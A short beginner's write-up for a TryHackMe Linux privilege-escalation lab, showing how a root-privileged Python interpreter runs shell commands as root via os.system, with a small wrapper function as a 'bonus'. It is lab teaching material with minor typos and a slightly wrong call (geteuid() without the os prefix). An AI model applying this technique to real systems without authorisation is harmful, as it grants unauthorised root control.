# Linux Privesc Playground - Try Hack Me - https://tryhackme.com/room/privescplayground
 
# This is my first Write-up but a simple one to preform.
 
$ input
>>> input python
'''
| output
''' 
so there is a trick to gain an easy shell with the help of python
first we have to see if python has root premonition so we could exploit it
 
$ python
'''
| >>>
''' 
now we are in the python interactive shell, this is sort of a testing ground for coders
but for us its just a convenient way to get a shell
 
we only need to init just one import for os commands
 
>>> import os
'''
|
'''
now, lets see if we are root, (euid = 0:root)
 
>>> geteuid()
'''
| 0
'''
Grate! python user has root privilege! lets use that ofc...
the syntax should look like this '''os.system("YOUR COMMAND GOES HERE")'''
 
>>> os.system("whoami")
'''
| root

| 0
'''

*** you can press the arrow-key-up button to toggle previous commands exactly like a regular shell
 
# -------------------------------------------------------------------------------
# bonus:

do you want to improve that?
 
>>> def A(i):
>>>     os.system(i)
>>>
|
 
>>> A('whoami')
| root
| 0
 
now all we need to do is A("YOUR COMMAND GOES HERE")


 
Hye! if you done the bonus why not get in to a python course?